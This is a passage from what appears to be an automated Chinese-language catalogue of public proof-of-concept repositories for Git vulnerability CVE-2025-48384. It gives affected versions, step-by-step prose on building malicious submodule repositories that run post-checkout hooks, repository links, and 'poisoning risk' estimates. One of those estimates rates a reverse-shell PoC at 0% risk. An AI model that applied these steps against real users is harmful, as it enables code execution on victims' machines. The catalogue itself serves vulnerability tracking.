CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

